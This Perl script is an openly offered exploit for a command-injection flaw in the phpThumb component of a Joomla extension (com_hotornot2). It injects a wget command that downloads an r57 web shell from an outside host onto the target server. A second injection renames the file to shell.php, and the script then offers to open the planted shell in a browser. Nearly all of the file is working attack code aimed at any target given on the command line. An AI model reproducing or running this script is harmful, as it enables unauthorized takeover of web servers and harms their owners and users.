#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request;
$target = $ARGV[0];

if($target eq '')
{
print "======================================================\n";
print "  DEVILSCREAM - WWW.NEWBIE-SECURITY.OR.ID             \n";
print "======================================================\n";
sleep(0.8);
print "Usage: perl exploit.pl <target> \n";
exit(1);
}

if ($target !~ /http:\/\//)
{
$target = "http://$target";
}

#print "[*] Enter the address of your hosted TXT shell (ex: '
http://c99.gen.tr/r57.txt') => ";
#$shell = <STDIN>;
sleep(1);
print "======================================================\n";
print "  DEVILSCREAM - WWW.NEWBIE-SECURITY.OR.ID             \n";
print "======================================================\n";
sleep(1.1);
print "[*] Testing exploit ... \n";
sleep(1.1);
$agent = LWP::UserAgent->new();
$agent->agent('Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101
Firefox/14.0.1');
$shell = "wget http://www.r57c99shell.net/shell/r57.txt -O shell.txt";
$website =
"$target/components/com_hotornot2/phpThumb/phpThumb.php??src=file.jpg&fltr

[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; $shell ;
&phpThumbDebug=9";

$request = $agent->request(HTTP::Request->new(GET=>$website));

if ($request->is_success)
{
print "[+] Exploit sent with success. \n";
sleep(1.4);
}

else
{
print "[-] Exploit sent but probably the website is not vulnerable. \n";
sleep(1.3);
}

print "[*] Checking if the txt shell has been uploaded...\n";
sleep(1.2);

$cwebsite =
"$target/components/com_hotornot2/phpThumb/shell.txt";
$creq = $agent->request(HTTP::Request->new(GET=>$cwebsite));

if ($creq->is_success)
{
print "[+] Txt Shell uploaded :) \n";
sleep(1);
print "[*] Moving it to PHP format... Please wait... \n";
sleep(1.1);
$mvwebsite =
"$target/components/com_hotornot2/phpThumb/phpThumb.php?

src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg
jpeg:fail.jpg ; mv shell.txt shell.php ;

&phpThumbDebug=9";
$mvreq = $agent->request(HTTP::Request->new(GET=>$mvwebsite));

$cwebsite =
"$target/components/com_hotornot2/phpThumb/shell.php";
$c2req = $agent->request(HTTP::Request->new(GET=>$cwebsite));

if ($c2req->is_success)
{
print "[+] PHP Shell uploaded => $cwebsite :) \n";
sleep(0.8);
print "[*] Do you want to open it? (y/n) => ";
$open = <STDIN>;

if ($open == "y")
{
$firefox = "firefox $cwebsite";
system($firefox);
}

}

else
{
print "[-] Error while moving shell from txt to PHP :( \n";
exit(1);
}

}

else
{
print "[-] Txt shell not uploaded. :( \n";
}
